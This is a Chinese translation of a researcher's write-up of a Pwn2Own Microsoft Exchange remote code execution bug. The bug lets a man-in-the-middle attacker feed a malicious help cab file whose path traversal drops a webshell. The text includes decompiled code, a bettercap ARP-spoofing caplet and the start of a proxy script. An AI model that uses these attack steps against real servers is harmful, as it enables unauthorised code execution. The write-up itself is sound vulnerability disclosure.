# Exchange Server 中间人劫持 RCE 漏洞分析
原文：
## Pwn2Own Vancouver 2021:: Microsoft Exchange Server 远程代码执行
2020 年 11 月中旬，我在 Microsoft Exchange Server
中发现了一个逻辑远程代码执行漏洞，该漏洞有一个奇怪的转折——它需要[在](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)触发之前[进行中间人攻击](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)(MiTM) 。我发现这个错误是因为我正在寻找调用
以`WebClient.DownloadFile`希望发现服务器端请求伪造漏洞，因为在交换服务器内的某些环境中，这种类型的漏洞[可能会产生巨大影响](https://github.com/SecureAuthCorp/impacket/pull/857)。后来，我发现[SharePoint
Server](https://www.zerodayinitiative.com/advisories/ZDI-21-829/)也受到本质上相同的代码模式的影响。
### 漏洞摘要
当管理用户在 Exchange 命令行管理程序中运行`Update-ExchangeHelp`或者`Update-ExchangeHelp
-Force`命令时，处于特权网络位置的未经身份验证的攻击者（例如 MiTM 攻击）可以触发远程执行代码漏洞。
### 漏洞分析
在`Microsoft.Exchange.Management.dll`文件中，定义了`Microsoft.Exchange.Management.UpdatableHelp.UpdatableExchangeHelpCommand`类:
    protected override void InternalProcessRecord()
    {
        TaskLogger.LogEnter();
        UpdatableExchangeHelpSystemException ex = null;
        try
        {
            ex = this.helpUpdater.UpdateHelp();    // 1
        }
        //...
在 _[1] 处_
，代码调用`HelpUpdater.UpdateHelp`方法。在`Microsoft.Exchange.Management.UpdatableHelp.HelpUpdater`类内部，我们看到：
    internal UpdatableExchangeHelpSystemException UpdateHelp()
    {
        double num = 90.0;
        UpdatableExchangeHelpSystemException result = null;
        this.ProgressNumerator = 0.0;
        if (this.Cmdlet.Force || this.DownloadThrottleExpired())
        {
            try
            {
                this.UpdateProgress(UpdatePhase.Checking, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
                string path = this.LocalTempBase + "UpdateHelp.$$$\\";
                this.CleanDirectory(path);
                this.EnsureDirectory(path);
                HelpDownloader helpDownloader = new HelpDownloader(this);
                helpDownloader.DownloadManifest();    // 2
这个函数执行一些操作。第一个是在[2]调用`DownloadManifest`时。让我们来看看`Microsoft.Exchange.Management.UpdatableHelp.HelpDownloader.DownloadManifest`：
    internal void DownloadManifest()
    {
        string downloadUrl = this.ResolveUri(this.helpUpdater.ManifestUrl);
        if (!this.helpUpdater.Cmdlet.Abort)
        {
            this.AsyncDownloadFile(UpdatableHelpStrings.UpdateComponentManifest, downloadUrl, this.helpUpdater.LocalManifestPath, 30000, new DownloadProgressChangedEventHandler(this.OnManifestProgressChanged), new AsyncCompletedEventHandler(this.OnManifestDownloadCompleted));  // 3
        }
    }
在[3]处，代码`ManifestUrl`调用`AsyncDownloadFile`。当从`InternalValidate`调用`LoadConfiguration`方法时设置`ManifestUrl`:
    protected override void InternalValidate()
    {
        TaskLogger.LogEnter();
        UpdatableExchangeHelpSystemException ex = null;
        try
        {
            this.helpUpdater.LoadConfiguration();   // 4
        }
    internal void LoadConfiguration()
    {
        //...
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\ExchangeServer\\v15\\UpdateExchangeHelp");
        if (registryKey3 == null)
        {
            registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\ExchangeServer\\v15\\UpdateExchangeHelp");
        }
        if (registryKey3 != null)
        {
            try
            {
                this.ManifestUrl = registryKey3.GetValue("ManifestUrl", "http://go.microsoft.com/fwlink/p/?LinkId=287244").ToString();  // 5
在[4]处代码在验证 cmdlet 的参数时调用 `LoadConfiguration` 。这将 `ManifestUrl`
设置为`http://go.microsoft.com/fwlink/p/?LinkId=287244`如果它不存在于注册表单元：`HKLM\SOFTWARE\Microsoft\ExchangeServer\v15\UpdateExchangeHelp`
(在[5]处)中。默认情况下，它不会这样做，所以值总是`http://go.microsoft.com/fwlink/p/?LinkId=287244`。
回到[3]的`AsyncDownloadFile`，这个方法将使用`WebClient.DownloadFileAsync`
API用于将文件下载到文件系统中。因为我们无法控制本地文件路径，所以这里没有vuln。稍后在UpdateHelp中，我们会看到以下代码:
    //...
    if (!this.Cmdlet.Abort)
    {
        UpdatableHelpVersionRange updatableHelpVersionRange = helpDownloader.SearchManifestForApplicableUpdates(this.CurrentHelpVersion, this.CurrentHelpRevision); // 6
        if (updatableHelpVersionRange != null)
        {
            double num2 = 20.0;
            this.ProgressNumerator = 10.0;
            this.UpdateProgress(UpdatePhase.Downloading, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
            string[] array = this.EnumerateAffectedCultures(updatableHelpVersionRange.CulturesAffected);
            if (array.Length != 0)  // 7
            {
                this.Cmdlet.WriteVerbose(UpdatableHelpStrings.UpdateApplyingRevision(updatableHelpVersionRange.HelpRevision, string.Join(", ", array)));
                helpDownloader.DownloadPackage(updatableHelpVersionRange.CabinetUrl);  // 8
                if (this.Cmdlet.Abort)
                {
                    return result;
                }
                this.ProgressNumerator += num2;
                this.UpdateProgress(UpdatePhase.Extracting, LocalizedString.Empty, (int)this.ProgressNumerator, 100);
                HelpInstaller helpInstaller = new HelpInstaller(this, array, num);
                helpInstaller.ExtractToTemp();  // 9
                //...
这里有很多东西需要解释。在[6]上，代码搜索下载的清单文件，以查找特定的版本或版本范围，并确保Exchange服务器的版本在该范围内。检查还确保新的修订号高于当前的修订号。如果满足了这些要求，那么代码将继续执行[7]，在这里检查区域性。因为我的目标是英语语言包，所以我将它设置为`en`，以便以后可以构造一个有效的路径。然后在[8]下载并存储`cabineturl`。这是xml清单文件中指定的.cab文件。
最后在[9]，使用`Microsoft.Exchange.Management.UpdatableHelp.HelpInstaller.ExtractToTemp`方法提取cab文件:
    internal int ExtractToTemp()
    {
        this.filesAffected = 0;
        this.helpUpdater.EnsureDirectory(this.helpUpdater.LocalCabinetExtractionTargetPath);
        this.helpUpdater.CleanDirectory(this.helpUpdater.LocalCabinetExtractionTargetPath);
        bool embedded = false;
        string filter = "";
        int result = EmbeddedCabWrapper.ExtractCabFiles(this.helpUpdater.LocalCabinetPath, this.helpUpdater.LocalCabinetExtractionTargetPath, filter, embedded);   // 10
        this.cabinetFiles = new Dictionary>();
        this.helpUpdater.RecursiveDescent(0, this.helpUpdater.LocalCabinetExtractionTargetPath, string.Empty, this.affectedCultures, false, this.cabinetFiles);
        this.filesAffected = result;
        return result;
    }
在[10]处`Microsoft.Exchange.CabUtility.dll`调用`Microsoft.Exchange.CabUtility.EmbeddedCabWrapper.ExtractCabFiles`，这是一个混合模式程序集，包含本地代码，使用导出的`ExtractCab`函数提取cab文件。不幸的是，该解析器在提取文件以验证文件是否包含目录遍历之前不注册回调函数。这允许我将任意文件写入任意位置。
### 利用
文件写入漏洞并不一定意味着远程执行代码，但在web应用程序的环境中，这种情况经常发生。我在Pwn2Own提出的攻击会写入C:/inetpub/wwwroot/aspnet_client目录，这允许我向shell发出http请求，以SYSTEM的身份执行任意代码，而不需要身份验证。
让我们回顾一下设置，以便我们能直观地看到攻击过程。
### 设置
第一步将要求您对目标系统执行ARP欺骗。在这个阶段，我选择使用[bettercap](https://www.bettercap.org/)，它允许您定义可以自动操作的caplets。我记得我上次有针对性的MiTM攻击是12年前的事了!这是我`poc.cap`文件，该文件设置了ARP欺骗和代理脚本，拦截和响应特定的http请求:
    set http.proxy.script poc.js
    http.proxy on
    set arp.spoof.targets 192.168.0.142
    events.stream off
    arp.spoof on
`poc.js`文件是我编写的代理脚本，用于拦截目标请求并将其重定向到位于
    function onLoad() {
        log_info("Exchange Server CabUtility ExtractCab Directory Traversal Remote Code Execution Vulnerability")
        log_info("Found by Steven Seeley of Source Incite")
    }